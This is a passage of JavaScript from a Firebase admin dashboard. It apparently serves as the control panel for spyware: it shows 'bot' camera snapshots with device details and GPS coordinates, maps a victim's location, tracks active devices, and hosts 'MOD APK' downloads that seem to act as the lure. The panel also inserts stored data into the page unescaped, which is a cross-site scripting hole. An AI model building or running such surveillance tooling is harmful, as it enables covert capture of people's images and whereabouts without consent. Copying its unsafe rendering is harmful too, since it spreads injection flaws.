                                'rgba(26, 188, 156, 0.7)',
                                'rgba(52, 73, 94, 0.7)'
                            ],
                            borderWidth: 1
                        }]
                    },
                    options: {
                        responsive: true,
                        plugins: {
                            legend: {
                                position: 'right',
                            }
                        }
                    }
                });
            }
        }

        // View snapshot
        async function viewSnapshot(key) {
            try {
                const snapshotRef = database.ref('botSnapshots').child(key);
                const snapshot = (await snapshotRef.once('value')).val();

                if (!snapshot) {
                    alert('Snapshot not found!');
                    return;
                }

                modalImage.src = snapshot.photo;
                
                imageMeta.innerHTML = `
                    <div class="meta-item"><span class="meta-label">Timestamp:</span> ${new Date(snapshot.timestamp).toLocaleString()}</div>
                    <div class="meta-item"><span class="meta-label">Device Info:</span> ${snapshot.deviceInfo || 'N/A'}</div>
                    <div class="meta-item"><span class="meta-label">Resolution:</span> ${snapshot.resolution || 'N/A'}</div>
                    ${snapshot.location ? `<div class="meta-item"><span class="meta-label">Location:</span> ${snapshot.location.latitude}, ${snapshot.location.longitude} <a href="${snapshot.location.mapLink}" target="_blank">(View Map)</a></div>` : ''}
                    <div class="meta-item"><span class="meta-label">File Size:</span> ${snapshot.fileSize ? (snapshot.fileSize / 1024).toFixed(2) + ' KB' : 'N/A'}</div>
                `;

                const downloadBtn = document.createElement('button');
                downloadBtn.className = 'btn btn-success';
                downloadBtn.style.marginTop = '15px';
                downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download Image';
                downloadBtn.onclick = () => {
                    const link = document.createElement('a');
                    link.href = snapshot.photo;
                    const dateStr = new Date(snapshot.timestamp).toISOString().replace(/[:.]/g, '-');
                    link.download = `snapshot_${key}_${dateStr}.jpg`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                };
                imageMeta.appendChild(downloadBtn);

                modal.style.display = 'flex';
            } catch (error) {
                console.error('Error viewing snapshot:', error);
                alert('Failed to load snapshot details: ' + error.message);
            }
        }

        // Delete snapshot
        async function deleteSnapshot(key) {
            if (!confirm('Are you sure you want to delete this snapshot? This action cannot be undone.')) return;

            try {
                const snapshotRef = database.ref('botSnapshots').child(key);
                const snapshotData = (await snapshotRef.once('value')).val();

                if (snapshotData && snapshotData.photo) {
                    const photoURL = snapshotData.photo;
                    const baseUrl = `https://firebasestorage.googleapis.com/v0/b/${firebaseConfig.storageBucket}/o/`;
                    if (photoURL.startsWith(baseUrl)) {
                        let storagePath = photoURL.substring(baseUrl.length);
                        const queryIndex = storagePath.indexOf('?');
                        if (queryIndex > -1) {
                            storagePath = storagePath.substring(0, queryIndex);
                        }
                        storagePath = decodeURIComponent(storagePath);
                        const storageRef = storage.ref(storagePath);
                        await storageRef.delete();
                        console.log('Image deleted from storage:', storagePath);
                    } else {
                        console.warn('Photo URL does not match expected Firebase Storage format, skipping storage deletion:', photoURL);
                    }
                }

                await snapshotRef.remove();
                alert('Snapshot deleted successfully!');
                loadSnapshots();
                loadDashboardData();
            } catch (error) {
                console.error('Error deleting snapshot:', error);
                alert('Failed to delete snapshot: ' + error.message);
            }
        }

        // Delete all snapshots
        async function deleteAllSnapshots() {
            if (!confirm('Are you absolutely sure you want to delete ALL snapshots? This action cannot be undone.')) return;

            try {
                const snapshotsRef = database.ref('botSnapshots');
                const allSnapshots = (await snapshotsRef.once('value')).val();

                if (allSnapshots) {
                    const deletePromises = [];
                    for (const key in allSnapshots) {
                        const snapshotData = allSnapshots[key];
                        if (snapshotData.photo) {
                            const photoURL = snapshotData.photo;
                            const baseUrl = `https://firebasestorage.googleapis.com/v0/b/${firebaseConfig.storageBucket}/o/`;
                            if (photoURL.startsWith(baseUrl)) {
                                let storagePath = photoURL.substring(baseUrl.length);
                                const queryIndex = storagePath.indexOf('?');
                                if (queryIndex > -1) {
                                    storagePath = storagePath.substring(0, queryIndex);
                                }
                                storagePath = decodeURIComponent(storagePath);
                                deletePromises.push(storage.ref(storagePath).delete().catch(e => console.warn('Failed to delete storage item:', storagePath, e.message)));
                            } else {
                                console.warn('Photo URL does not match expected Firebase Storage format for key:', key);
                            }
                        }
                        deletePromises.push(snapshotsRef.child(key).remove().catch(e => console.warn('Failed to delete RTDB item:', key, e.message)));
                    }
                    await Promise.allSettled(deletePromises);
                }

                alert('All snapshots deleted successfully!');
                loadSnapshots();
                loadDashboardData();
            } catch (error) {
                console.error('Error deleting all snapshots:', error);
                alert('Failed to delete all snapshots: ' + error.message);
            }
        }

        // Load snapshots
        async function loadSnapshots() {
            const tbody = document.getElementById('snapshotsList');
            tbody.innerHTML = '<tr><td colspan="5">Loading...</td></tr>';
            
            try {
                const snapshot = await database.ref('botSnapshots').once('value');
                const data = snapshot.val();
                tbody.innerHTML = '';
                
                if (!data) {
                    tbody.innerHTML = '<tr><td colspan="5">No snapshots available</td></tr>';
                    return;
                }
                
                const sortedData = Object.entries(data).sort((a, b) => b[1].timestamp - a[1].timestamp);
                
                sortedData.forEach(([key, snapshot]) => {
                    const row = document.createElement('tr');
                    const date = new Date(snapshot.timestamp);
                    
                    row.innerHTML = `
                        <td>
                            <img src="${snapshot.photo}" alt="Snapshot" class="image-preview" 
                                 onclick="viewSnapshot('${key}')">
                        </td>
                        <td>${date.toLocaleString()}</td>
                        <td>${snapshot.deviceInfo ? snapshot.deviceInfo.substring(0, Math.min(snapshot.deviceInfo.length, 30)) + (snapshot.deviceInfo.length > 30 ? '...' : '') : 'Unknown'}</td>
                        <td>${snapshot.resolution || 'N/A'}</td>
                        <td>
                            <button class="btn btn-primary" onclick="viewSnapshot('${key}')">
                                <i class="fas fa-eye"></i> View
                            </button>
                            <button class="btn btn-danger" onclick="deleteSnapshot('${key}')">
                                <i class="fas fa-trash"></i> Delete
                            </button>
                        </td>
                    `;
                    tbody.appendChild(row);
                });
            } catch (error) {
                console.error('Error loading snapshots:', error);
                tbody.innerHTML = `<tr><td colspan="5">Error loading snapshots: ${error.message}</td></tr>`;
            }
        }

        // Load locations
        async function loadLocations() {
            const tbody = document.getElementById('locationsList');
            tbody.innerHTML = '<tr><td colspan="4">Loading...</td></tr>';
            
            try {
                const snapshot = await database.ref('userData/location').once('value');
                const data = snapshot.val();
                tbody.innerHTML = '';
                
                if (!data) {
                    tbody.innerHTML = '<tr><td colspan="4">No locations available</td></tr>';
                    markers.forEach(marker => map.removeLayer(marker));
                    markers = [];
                    return;
                }
                
                const date = new Date(data.timestamp);
                
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${date.toLocaleString()}</td>
                    <td>${data.latitude}, ${data.longitude}</td>
                    <td><a href="${data.mapLink}" target="_blank">View on Google Maps</a></td>
                    <td>
                        <button class="btn btn-primary" onclick="viewLocationOnMap(${data.latitude}, ${data.longitude})">
                            <i class="fas fa-map-marked-alt"></i> View Map
                        </button>
                    </td>
                `;
                tbody.appendChild(row);
                
                if (map) {
                    markers.forEach(marker => map.removeLayer(marker));
                    markers = [];
                    const marker = L.marker([data.latitude, data.longitude]).addTo(map)
                        .bindPopup(`<b>User Location</b><br>Lat: ${data.latitude}<br>Lng: ${data.longitude}`);
                    markers.push(marker);
                    map.fitBounds([marker.getLatLng()]);
                }
            } catch (error) {
                console.error('Error loading locations:', error);
                tbody.innerHTML = `<tr><td colspan="4">Error loading locations: ${error.message}</td></tr>`;
            }
        }

        // Load devices
        async function loadDevices() {
            const tbody = document.getElementById('devicesList');
            tbody.innerHTML = '<tr><td colspan="5">Loading...</td></tr>';
            
            try {
                const snapshot = await database.ref('botSnapshots').once('value');
                const data = snapshot.val();
                tbody.innerHTML = '';
                
                if (!data) {
                    tbody.innerHTML = '<tr><td colspan="5">No device data available</td></tr>';
                    return;
                }
                
                const devices = {};
                Object.values(data).forEach(snapshot => {
                    const deviceId = snapshot.deviceInfo || 'Unknown';
                    if (!devices[deviceId]) {
                        devices[deviceId] = {
                            firstSeen: snapshot.timestamp,
                            lastActive: snapshot.timestamp,
                            count: 1
                        };
                    } else {
                        devices[deviceId].count++;
                        if (snapshot.timestamp < devices[deviceId].firstSeen) {
                            devices[deviceId].firstSeen = snapshot.timestamp;
                        }
                        if (snapshot.timestamp > devices[deviceId].lastActive) {
                            devices[deviceId].lastActive = snapshot.timestamp;
                        }
                    }
                });
                
                Object.entries(devices).forEach(([deviceId, deviceData]) => {
                    const row = document.createElement('tr');
                    const firstSeen = new Date(deviceData.firstSeen);
                    const lastActive = new Date(deviceData.lastActive);
                    const isActive = (Date.now() - lastActive.getTime()) < (24 * 60 * 60 * 1000);
                    
                    row.innerHTML = `
                        <td>${deviceId.substring(0, Math.min(deviceId.length, 20))}...</td>
                        <td title="${deviceId}">${deviceId.substring(0, Math.min(deviceId.length, 30))}...</td>
                        <td>${firstSeen.toLocaleString()}</td>
                        <td>${lastActive.toLocaleString()}</td>
                        <td><span class="status ${isActive ? 'active' : 'inactive'}">${isActive ? 'Active' : 'Inactive'}</span></td>
                    `;
                    tbody.appendChild(row);
                });
            } catch (error) {
                console.error('Error loading devices:', error);
                tbody.innerHTML = `<tr><td colspan="5">Error loading device data: ${error.message}</td></tr>`;
            }
        }

        // Load settings
        function loadSettings() {
            database.ref('settings').once('value').then(snapshot => {
                const data = snapshot.val();
                if (data) {
                    document.getElementById('snapshotInterval').value = data.snapshotInterval || 5;
                    document.getElementById('dataRetention').value = data.dataRetention || 30;
                } else {
                    document.getElementById('snapshotInterval').value = 5;
                    document.getElementById('dataRetention').value = 30;
                }
            }).catch(error => {
                console.error('Error loading settings:', error);
                alert('Failed to load settings: ' + error.message);
                document.getElementById('snapshotInterval').value = 5;
                document.getElementById('dataRetention').value = 30;
            });
        }

        // Save settings
        async function saveSettings() {
            const snapshotInterval = document.getElementById('snapshotInterval').value;
            const dataRetention = document.getElementById('dataRetention').value;

            if (snapshotInterval < 1 || snapshotInterval > 60) {
                alert('Snapshot Interval must be between 1 and 60 seconds.');
                return;
            }
            if (dataRetention < 1 || dataRetention > 365) {
                alert('Data Retention must be between 1 and 365 days.');
                return;
            }

            try {
                await database.ref('settings').set({
                    snapshotInterval: parseInt(snapshotInterval),
                    dataRetention: parseInt(dataRetention),
                    lastUpdated: firebase.database.ServerValue.TIMESTAMP
                });
                alert('Settings saved successfully!');
            } catch (error) {
                console.error('Error saving settings:', error);
                alert('Failed to save settings: ' + error.message);
            }
        }

        // Start live camera feed
        async function startLiveCameraFeed() {
            if (liveStream) {
                alert('Live feed is already running.');
                return;
            }

            try {
                liveVideoElement.style.display = 'block';
                liveStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                liveVideoElement.srcObject = liveStream;
                await liveVideoElement.play();
                liveInterval = setInterval(captureAndUploadLiveFrame, 5000);
                startLiveFeedBtn.disabled = true;
                stopLiveFeedBtn.disabled = false;
                console.log('Live camera feed started.');
            } catch (error) {
                console.error('Error accessing camera:', error);
                alert('Failed to start live camera feed. Error: ' + error.message);
                stopLiveCameraFeed();
            }
        }

        // Stop live camera feed
        function stopLiveCameraFeed() {
            if (liveInterval) {
                clearInterval(liveInterval);
                liveInterval = null;
            }
            if (liveStream) {
                liveStream.getTracks().forEach(track => track.stop());
                liveStream = null;
                liveVideoElement.srcObject = null;
                liveVideoElement.style.display = 'none';
            }
            startLiveFeedBtn.disabled = false;
            stopLiveFeedBtn.disabled = true;
            console.log('Live camera feed stopped.');
        }

        // Capture and upload live frame
        async function captureAndUploadLiveFrame() {
            if (!liveVideoElement || !liveStream || liveVideoElement.videoWidth === 0) {
                console.warn('Live video not ready for capture.');
                return;
            }

            try {
                liveCanvasElement.width = liveVideoElement.videoWidth;
                liveCanvasElement.height = liveVideoElement.videoHeight;
                const context = liveCanvasElement.getContext('2d');
                context.drawImage(liveVideoElement, 0, 0, liveCanvasElement.width, liveCanvasElement.height);

                liveCanvasElement.toBlob(async (blob) => {
                    if (!blob) {
                        console.error('Failed to create image blob from canvas.');
                        return;
                    }

                    const timestamp = Date.now();
                    const deviceId = `AdminPanelLiveFeed_${Date.now()}`;
                    const filename = `live_snapshots/${deviceId}_${timestamp}.jpg`;
                    const storageRef = storage.ref(filename);

                    const uploadTask = storageRef.put(blob);
                    uploadTask.on('state_changed',
                        (snapshot) => {},
                        (error) => {
                            console.error('Upload failed:', error);
                        },
                        async () => {
                            const downloadURL = await storageRef.getDownloadURL();
                            console.log('Image uploaded:', downloadURL);

                            const newSnapshotRef = database.ref('botSnapshots').push();
                            await newSnapshotRef.set({
                                image: downloadURL,
                                timestamp: timestamp,
                                deviceInfo: `Live Feed from Admin Panel (${navigator.userAgent})`,
                                resolution: `${liveVideoElement.videoWidth}x${liveVideoElement.videoHeight}`,
                                fileSize: blob.size,
                                type: 'live'
                            });

                            latestLiveImage.src = downloadURL;
                            latestLiveImageTimestamp.textContent = `Last updated: ${new Date(timestamp).toLocaleString()}`;
                            console.log('Live snapshot saved to DB.');
                        }
                    );
                }, 'image/jpeg', 0.9);
            } catch (error) {
                console.error('Error capturing or uploading live frame:', error);
            }
        }

        // Load live feed data
        function loadLiveFeedData() {
            database.ref('botSnapshots').orderByChild('timestamp').limitToLast(1).once('value', snapshot => {
                let latestLive = null;
                snapshot.forEach(childSnapshot => {
                    if (childSnapshot.val().type === 'live') {
                        latestLive = childSnapshot.val();
                    }
                });

                if (latestLive) {
                    latestLiveImage.src = latestLive.photo;
                    latestLiveImageTimestamp.textContent = `Last updated: ${new Date(latestLive.timestamp).toLocaleString()}`;
                } else {
                    latestLiveImage.src = "https://via.placeholder.com/400x300?text=No+Live+Image";
                    latestLiveImageTimestamp.textContent = "No live image captured yet.";
                }
            }).catch(error => {
                console.error('Error loading latest live image:', error);
                latestLiveImage.src = "https://via.placeholder.com/400x300?text=Error+Loading+Image";
                latestLiveImageTimestamp.textContent = `Error: ${error.message}`;
            });
        }

        // --- New Section Logic ---

        // Load MOD APKs
        function loadMods() {
            const tbody = document.getElementById('apkList');
            tbody.innerHTML = '<tr><td colspan="4">Loading...</td></tr>';
            database.ref('modApks').on('value', snapshot => {
                tbody.innerHTML = '';
                const data = snapshot.val();
                if (!data) {
                    tbody.innerHTML = '<tr><td colspan="4">No MOD APKs available</td></tr>';
                    return;
                }
                Object.entries(data).forEach(([key, apk]) => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${apk.name}</td>
                        <td>${apk.version}</td>
                        <td>${apk.size} MB</td>
                        <td>
                            <button class="btn btn-primary" onclick="viewApk('${key}')">
                                <i class="fas fa-eye"></i> View
                            </button>
                            <button class="btn btn-danger" onclick="deleteApk('${key}')">
                                <i class="fas fa-trash"></i> Delete
                            </button>
                        </td>
                    `;
                    tbody.appendChild(row);
                });
            }, error => {
                tbody.innerHTML = `<tr><td colspan="4">Error: ${error.message}</td></tr>`;
            });
        }

        // View APK
        function viewApk(key) {
            database.ref(`modApks/${key}`).once('value').then(snapshot => {
                const apk = snapshot.val();
                if (apk) {
                    alert(`Name: ${apk.name}\nDescription: ${apk.description}\nVersion: ${apk.version}\nSize: ${apk.size} MB\nDownload URL: ${apk.downloadUrl}`);
                }
            });
        }

        // Delete APK
        async function deleteApk(key) {
            if (!confirm('Are you sure you want to delete this APK?')) return;
            try {
                const apkRef = database.ref(`modApks/${key}`);
                const apkData = (await apkRef.once('value')).val();
                if (apkData && apkData.downloadUrl) {
                    const storageRef = storage.refFromURL(apkData.downloadUrl);
                    await storageRef.delete();
                }
                await apkRef.remove();
                alert('APK deleted successfully!');
            } catch (error) {
                alert(`Error deleting APK: ${error.message}`);
            }
        }

        // Add MOD APK
        document.getElementById('addApk').addEventListener('click', async () => {
            const name = document.getElementById('apkName').value.trim();
            const description = document.getElementById('apkDescription').value.trim();
            const file = document.getElementById('apkFile').files[0];
            const version = document.getElementById('apkVersion').value.trim();
            const size = document.getElementById('apkSize').value.trim();

            if (!name || !description || !file || !version || !size) {
                alert('Please fill in all fields.');
                return;
            }

            try {
                const apkId = 'apk_' + Date.now();
                const storageRef = storage.ref(`modApks/${apkId}/${file.name}`);
                const uploadTask = await storageRef.put(file);
                const downloadUrl = await uploadTask.ref.getDownloadURL();

                await database.ref(`modApks/${apkId}`).set({
                    name,
                    description,
                    downloadUrl,
                    version,
                    size: parseFloat(size),
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                });

                alert('APK added successfully!');
                document.getElementById('modApkForm').reset();
            } catch (error) {
                alert(`Error adding APK: ${error.message}`);
            }
        });

        // Load Help content
        function loadHelp() {
            database.ref('helpContent').once('value').then(snapshot => {
                const data = snapshot.val();
                document.getElementById('helpContent').value = data?.content || '';
            }).catch(error => {
                alert(`Error loading help content: ${error.message}`);
            });
        }

        // Save Help content
        document.getElementById('saveHelp').addEventListener('click', async () => {
            const content = document.getElementById('helpContent').value.trim();
            if (!content) {
                alert('Please enter help content.');
                return;
            }
            try {
                await database.ref('helpContent').set({
                    content,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                });
                alert('Help content saved successfully!');
            } catch (error) {
                alert(`Error saving help content: ${error.message}`);
            }
        });

        // Load Support queries
        function loadSupport() {
            const tbody = document.getElementById('supportList');
            tbody.innerHTML = '<tr><td colspan="4">Loading...</td></tr>';
            database.ref('supportQueries').on('value', snapshot => {
                tbody.innerHTML = '';
                const data = snapshot.val();
                if (!data) {
                    tbody.innerHTML = '<tr><td colspan="4">No support queries available</td></tr>';
                    return;
                }
                Object.entries(data).forEach(([key, query]) => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${query.subject}</td>
                        <td><span class="status ${query.status}">${query.status}</span></td>
                        <td>${new Date(query.timestamp).toLocaleString()}</td>
                        <td>
                            <button class="btn btn-primary" onclick="viewSupport('${key}')">
                                <i class="fas fa-eye"></i> View
                            </button>
                            <button class="btn btn-success" onclick="respondSupport('${key}')">
                                <i class="fas fa-reply"></i> Respond
                            </button>
                            <button class="btn btn-primary" onclick="markResolved('${key}')">
                                <i class="fas fa-check"></i> Resolve
                            </button>
                        </td>
                    `;
                    tbody.appendChild(row);
                });
            }, error => {
                tbody.innerHTML = `<tr><td colspan="4">Error: ${error.message}</td></tr>`;
            });
        }

        // View Support query
        function viewSupport(key) {
            database.ref(`supportQueries/${key}`).once('value').then(snapshot => {
                const query = snapshot.val();
                if (query) {
                    alert(`Subject: ${query.subject}\nMessage: ${query.message}\nDevice: ${query.deviceInfo}\nStatus: ${query.status}${query.response ? `\nResponse: ${query.response}` : ''}`);
                }
            });
        }

        // Respond to Support
        function respondSupport(key) {
            const response = prompt('Enter response:');
            if (response) {
                database.ref(`supportQueries/${key}`).update({
                    response,
                    status: 'responded'
                }).then(() => {
                    alert('Response sent successfully!');
                }).catch(error => {
                    alert(`Error responding: ${error.message}`);
                });
            }
        }

        // Mark Support as resolved
        function markResolved(key) {
            if (confirm('Mark this query as resolved?')) {
                database.ref(`supportQueries/${key}`).update({
                    status: 'resolved'
                }).then(() => {
                    alert('Query marked as resolved!');
                }).catch(error => {
                    alert(`Error: ${error.message}`);
                });
            }
        }

        // Load Adsterra code
        function loadAdsterra() {
            database.ref('adsterraAds').once('value').then(snapshot => {
                const data = snapshot.val();
                document.getElementById('adsterraCode').value = data?.code || '';
            }).catch(error => {
                alert(`Error loading Adsterra code: ${error.message}`);
            });
        }

        // Save Adsterra code
        document.getElementById('saveAdsterra').addEventListener('click', async () => {
            const code = document.getElementById('adsterraCode').value.trim();
            try {
                await database.ref('adsterraAds').set({
                    code,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                });
                alert('Adsterra ad code saved successfully!');
            } catch (error) {
                alert(`Error saving Adsterra code: ${error.message}`);
            }
        });

        // Event Listeners
        document.getElementById('refreshRecent').addEventListener('click', loadDashboardData);
        document.getElementById('refreshSnapshots').addEventListener('click', loadSnapshots);
        document.getElementById('refreshLocations').addEventListener('click', loadLocations);
        document.getElementById('refreshDevices').addEventListener('click', loadDevices);
        document.getElementById('saveSettings').addEventListener('click', saveSettings);
        document.getElementById('deleteAllSnapshots').addEventListener('click', deleteAllSnapshots);
        document.getElementById('startLiveFeedBtn').addEventListener('click', startLiveCameraFeed);
        document.getElementById('stopLiveFeedBtn').addEventListener('click', stopLiveCameraFeed);
        document.getElementById('refreshApks').addEventListener('click', loadMods);
        document.getElementById('refreshSupport').addEventListener('click', loadSupport);

        // Initial load
        document.addEventListener('DOMContentLoaded', () => {
            loadSectionData('dashboard');
        });
    </script>
</body>
</html>